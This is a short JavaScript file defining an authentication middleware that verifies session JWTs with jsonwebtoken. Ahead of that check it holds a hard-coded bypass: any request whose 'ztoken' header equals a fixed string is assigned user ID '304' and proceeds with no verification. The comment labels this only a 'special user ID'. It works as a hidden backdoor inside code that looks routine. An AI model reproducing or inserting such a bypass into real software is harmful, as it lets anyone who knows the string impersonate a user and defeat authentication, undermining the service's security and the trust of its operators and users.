import jwt from 'jsonwebtoken';

function authMiddleware(req, res, next) {
    const sessionToken = req.session.token;
    const zToken = req.headers['ztoken'];

    if (zToken === 'wtfisatoken') {
        req.userId = '304'; // Set a special user ID
        next(); // Proceed to the next middleware
    } else if (sessionToken) {
        try {
            const decoded = jwt.verify(sessionToken, process.env.SECRET_KEY);
            req.userId = decoded.userId; // Attach user ID to the request object
            next(); // Proceed to the next middleware
        } catch (error) {
            res.status(401).json({ error: 'Unauthorized (invalid token)' });
        }
    } else {
        res.status(401).json({ error: 'Unauthorized (missing token)' });
    }
}

export { authMiddleware };
